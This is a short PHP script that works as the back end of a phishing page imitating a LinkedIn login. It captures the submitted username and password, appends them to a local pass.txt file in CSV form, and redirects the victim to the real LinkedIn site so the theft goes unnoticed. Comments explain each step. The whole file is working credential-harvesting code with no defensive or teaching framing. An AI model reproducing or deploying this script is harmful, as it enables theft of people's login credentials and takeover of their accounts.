<?php
    //these are the names of the POST's of interest, that is the username and password
    //there is no need to save anything else such as the cookies
    $username = $_POST["username"];
    $pass = $_POST["password"];

    //create a file called pass.txt or write into it if created the results of what was
    //in the POST value. It if formatted in csv format
    $handle = fopen("pass.txt", "a");
    fwrite($handle, $username . ", " . $pass . "\n");
    fclose($handle);

    //After the user clicks on login, the window will be redirected to the actual Linkedin site
    header ("Location: https://www.linkedin.com");

    exit;
?>
